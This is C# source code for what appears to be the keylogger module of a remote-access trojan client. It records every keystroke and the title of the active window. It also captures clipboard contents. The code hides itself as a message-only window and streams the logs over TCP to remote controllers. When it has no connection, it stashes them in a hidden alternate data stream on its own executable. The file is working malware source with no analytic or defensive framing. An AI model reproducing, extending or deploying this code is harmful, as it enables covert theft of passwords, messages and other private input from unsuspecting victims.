using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using MessagePack;
using Microsoft.Win32.SafeHandles;
using RawInput;

namespace Client.HandlePacket
{
    public class HandleKeylogger : Form
    {
        public List<string> controlers;
        public bool offline;
        private InputDevice id;
        public FileStream file;
        private StreamWriter sw;
        private string CurrentActiveWindowTitle;
        private string path = Process.GetCurrentProcess().MainModule.FileName + ":keylogger";


        public HandleKeylogger()
        {
            ChangeToMessageOnlyWindow();
            controlers = new List<string>();
            file = CreateFileStream(path, FileAccess.ReadWrite, FileMode.OpenOrCreate, FileShare.ReadWrite);
            sw = new StreamWriter(file);
            CurrentActiveWindowTitle = "";
            id = new InputDevice(Handle);
            id.EnumerateDevices();
            id.KeyPressed += m_KeyPressed;
        }

        private static FileStream CreateFileStream(string path, FileAccess access, FileMode mode, FileShare share)
        {
            if (mode == FileMode.Append)
                mode = FileMode.OpenOrCreate;
            var handle = CreateFile(path, access, share, IntPtr.Zero, mode, 0, IntPtr.Zero);
            if (handle.IsInvalid)
                throw new IOException("Could not open file stream.", new Win32Exception());
            return new FileStream(handle, access);
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern SafeFileHandle CreateFile(string lpFileName, FileAccess dwDesiredAccess,
            FileShare dwShareMode, IntPtr lpSecurityAttributes, FileMode dwCreationDisposition,
            int dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("user32.dll")]
        private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        private void ChangeToMessageOnlyWindow()
        {
            var HWND_MESSAGE = new IntPtr(-3);
            SetParent(Handle, HWND_MESSAGE);
        }

        protected override void WndProc(ref Message message)
        {
            try
            {
                if (id != null)
                    switch (message.Msg)
                    {
                        case InputDevice.WM_INPUT:
                        {
                            id.ProcessInputCommand(message);
                            break;
                        }
                        case InputDevice.WM_CLIPBOARDUPDATE:
                        {
                            if (controlers.Count > 0)
                                foreach (var Controler_HWID in controlers)
                                {
                                    var msgpack = new MsgPack();
                                    msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                                    msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                                    msgpack.ForcePathObject("log").AsString =
                                        $"\n###  Clipboard ###\n{Clipboard.GetCurrentText()}\n";
                                    Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                                }

                            if (offline) sw.Write($"\n###  Clipboard ###\n{Clipboard.GetCurrentText()}\n");
                        }
                            break;
                    }
            }
            catch{}

            base.WndProc(ref message);
        }

        internal static class Clipboard
        {
            public static string GetCurrentText()
            {
                var ReturnValue = string.Empty;
                var STAThread = new Thread(
                    delegate() { ReturnValue = System.Windows.Forms.Clipboard.GetText(); });
                STAThread.SetApartmentState(ApartmentState.STA);
                STAThread.Start();
                STAThread.Join();

                return ReturnValue;
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);
        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }

        private void m_KeyPressed(object sender, InputDevice.KeyControlEventArgs e)
        {
            int vkCode = e.Keyboard.key;
            bool capsLockPressed = (GetKeyState(0x14) & 0xffff) != 0;
            bool shiftPressed = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
            string currentKey = KeyboardLayout((uint)vkCode);

            if (capsLockPressed || shiftPressed)
            {
                currentKey = currentKey.ToUpper();
            }
            else
            {
                currentKey = currentKey.ToLower();
            }

            if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                currentKey = "[" + (Keys)vkCode + "]";
            else
            {
                switch (((Keys)vkCode).ToString())
                {
                    case "Space":
                        currentKey = " ";
                        break;
                    case "Return":
                        currentKey = "[ENTER]\n";
                        break;
                    case "Escape":
                        currentKey = "[ESC]\n";
                        break;
                    case "Back":
                        currentKey = "[Back]";
                        break;
                    case "Tab":
                        currentKey = "[Tab]\n";
                        break;
                }
            }

            var sb = new StringBuilder();
            if (CurrentActiveWindowTitle == GetActiveWindowTitle())
            {
                sb.Append(currentKey);
            }
            else
            {
                sb.Append(Environment.NewLine);
                sb.Append(Environment.NewLine);
                sb.Append($"###  {GetActiveWindowTitle()} | {DateTime.Now.ToShortTimeString()} ###");
                sb.Append(Environment.NewLine);
                sb.Append(currentKey);
            }

            if (controlers.Count > 0)
                foreach (var Controler_HWID in controlers)
                {
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                    msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                    msgpack.ForcePathObject("log").AsString = sb.ToString();
                    Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                }

            if (offline) sw.Write(sb.ToString());
        }


        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                var stringBuilder = new StringBuilder(nChars);
                var handle = GetForegroundWindow();
                if (GetWindowText(handle, stringBuilder, nChars) > 0)
                {
                    CurrentActiveWindowTitle = stringBuilder.ToString();
                    return CurrentActiveWindowTitle;
                }
            }
            catch
            {
                return "???";
            }

            return "???";
        }
    }
}